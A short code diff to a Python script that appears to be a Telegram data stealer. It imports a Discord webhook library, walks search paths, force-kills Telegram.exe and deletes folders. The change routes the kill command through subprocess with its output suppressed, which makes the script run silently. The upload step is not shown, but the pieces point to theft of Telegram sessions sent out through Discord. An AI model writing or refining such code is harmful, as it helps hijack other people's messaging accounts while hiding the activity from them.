@@ -2,6 +2,7 @@ import os
 import time
 import zipfile
 import shutil
+import subprocess
 from discord_webhook import DiscordWebhook
 
 # ======= Настройки =======
@@ -22,7 +23,7 @@ for path in SEARCH_PATHS:
 # ======= Функции =======
 
 def task_kill():
-    os.system('taskkill /f /im Telegram.exe')
+    subprocess.run(['taskkill', '/f', '/im', 'Telegram.exe'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(0.3)
 
 def delete_fold():
